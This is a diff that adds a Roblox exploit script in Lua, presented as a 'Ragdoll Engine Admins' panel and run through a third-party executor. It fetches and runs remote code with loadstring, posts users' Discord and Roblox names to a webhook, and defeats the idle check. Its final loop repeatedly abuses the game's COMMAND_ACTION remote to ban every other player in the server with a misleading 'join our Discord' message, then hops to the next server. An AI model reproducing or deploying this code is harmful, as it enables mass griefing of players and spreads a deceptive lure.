@@ -1,0 +1,264 @@
+local player = "stopCALLmeRICH" and "Kar_Ziad"
+local webhook = ""
+
+
+
+--- variables
+
+
+game.Players.PlayerAdded:Connect(function(plr)
+  if plr.Name == player then
+    local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
+     module:Teleport(game.PlaceId)
+  end
+end)
+
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+local Window = Rayfield:CreateWindow({
+    Name = "Ragdoll Engine Admins",
+    LoadingTitle = "Loading Scripts",
+    LoadingSubtitle = "by Ragdoll Team",
+    ConfigurationSaving = {
+       Enabled = false,
+       FolderName = nil,
+       FileName = "Big Hub"
+    },
+    Discord = {
+       Enabled = false,
+       Invite = "noinvitelink",
+       RememberJoins = false
+    },
+    KeySystem = false,
+    KeySettings = {
+       Title = "",
+       Subtitle = "",
+       Note = "",
+       FileName = "SiriusKey",
+       SaveKey = false,
+       GrabKeyFromSite = false, 
+       Key = "Hello"
+    }
+ })
+ local Tab = Window:CreateTab("Home")
+ local login = Window:CreateTab("Login Page")
+ local antispam2 = false
+local Discord
+local points
+local Time = os.date('!*t', OSTime)
+local button = login:CreateButton({
+    Name = "✅ Login",
+    Callback = function()
+        if antispam2 == false then
+            antispam2 = true
+                if isfile("/data/name.cfg") then
+                    
+                    http = game:GetService("HttpService")
+                    
+                    
+                    
+                    local repon = syn.request({
+                        Url = webhook,
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                    Body = http:JSONEncode({
+                        ["content"] = "",
+                        ["embeds"] = {{
+                            ["title"] = "Admin Logged In ✅",
+                            ["type"] = "rich",
+                            ["fields"] = {
+                                {
+                                    ["name"] = "Admin Discord",
+                                    ["value"] = readfile("/data/name.cfg"),
+                                    ["inline"] = false
+                                },
+                                {
+                                    ["name"] = "Roblox Account",
+                                    ["value"] = game.Players.LocalPlayer.Name,
+                                    ["inline"] = false
+                                }
+                               
+                            },
+                            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec) 
+                        }}
+                    })
+                    })
+                else
+                    Rayfield:Notify({
+                        Title = "!",
+                        Content = "You Must Put your discord and save to Login",
+                        Duration = 6.5,
+                     
+                        Actions = { -- Notification Buttons
+                           Ignore = {
+                              Name = "Okay!",
+                              Callback = function()
+                              print("The user tapped Okay!")
+                           end
+                        },
+                     },
+                     })
+                end
+                else
+                    Rayfield:Notify({
+                        Title = "!",
+                        Content = "Dont Spam !!!",
+                        Duration = 6.5,
+                        
+                
+                     })
+                     wait(35)
+                     antispam2 = false
+            end
+    end,
+ })
+ local antispam = false
+ local buttoon = login:CreateButton({
+    Name = "❌ LogOut",
+    Callback = function()
+        if antispam == false then
+    antispam = true
+        if isfile("/data/name.cfg") then
+            
+            http = game:GetService("HttpService")
+         
+            
+            
+            local repon = syn.request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+            Body = http:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "Admin Logged Out ❌",
+                    ["type"] = "rich",
+                    ["fields"] = {
+                        {
+                            ["name"] = "Admin Discord",
+                            ["value"] = readfile("/data/name.cfg"),
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Roblox Account",
+                            ["value"] = game.Players.LocalPlayer.Name,
+                            ["inline"] = false
+                        }
+                    },
+                    ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
+                }}
+            })
+            })
+        else
+            Rayfield:Notify({
+                Title = "!",
+                Content = "You Must Put your discord and save to Login",
+                Duration = 6.5,
+             
+                Actions = { -- Notification Buttons
+                   Ignore = {
+                      Name = "Okay!",
+                      Callback = function()
+                      print("The user tapped Okay!")
+                   end
+                },
+             },
+             })
+        end
+        else
+            Rayfield:Notify({
+                Title = "!",
+                Content = "Dont Spam !!!",
+                Duration = 6.5,
+             })
+             wait(35)
+             antispam = false
+    end
+    end,
+ })
+local Input = Tab:CreateInput({
+    Name = "Enter Discord",
+    PlaceholderText = "Enter Discord here",
+    RemoveTextAfterFocusLost = true,
+    Callback = function(v)
+        Discord = v
+    end,
+ })
+ local Label = Tab:CreateLabel("Checking ..")
+local Button = Tab:CreateButton({
+    Name = "Save",
+    Callback = function()
+        if isfile("/data/name.cfg") then
+            Rayfield:Notify({
+                Title = "!",
+                Content = "you are already saved data and your Discord : "..readfile("/data/name.cfg"),
+                Duration = 6.5,
+               
+             })
+             Label:Set("Discord : "..readfile("/data/name.cfg"))
+        else
+         makefolder("/data")
+         writefile("/data/name.cfg",Discord)
+        end
+    end,
+ })
+
+
+
+function label()
+   
+   if isfile("/data/name.cfg") then
+    Label:Set("Discord : "..readfile("/data/name.cfg"))
+
+   else
+ 
+   end
+end
+label()
+
+
+--AntiAfk
+local GC = getconnections or get_signal_cons
+if GC then
+	for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
+		if v["Disable"] then
+			v["Disable"](v)
+		elseif v["Disconnect"] then
+			v["Disconnect"](v)
+		end
+	end
+else
+	game.Players.LocalPlayer.Idled:Connect(function()
+		local VirtualUser = game:GetService("VirtualUser")
+		VirtualUser:CaptureController()
+		VirtualUser:ClickButton2(Vector2.new())
+	end)
+end
+
+local NoBan = game.Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+--U CAN EDIT TEXT AND DURATION
+local Text = "This version of Ragdoll Engine has been closed. Join our Discord server (https://discord.gg/ragdoll) or new group to access the new version"
+local duration = "999999999"
+
+while task.wait(25) do
+    coroutine.wrap(function()
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            
+        
+            if v ~= NoBan then
+                local args = {[1] = "Ban",[2] = v.UserId,[3] = {["Time"] = duration,["Reason"] = Text}}
+                game:GetService("ReplicatedStorage"):WaitForChild("COMMAND_ACTION"):InvokeServer(unpack(args))
+            end
+    
+    
+end
+        if #game.Players:GetPlayers() <= 1 then
+            NoBan:Kick("\nSearching new server...")
+            game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+        end
+    end)()
+end 
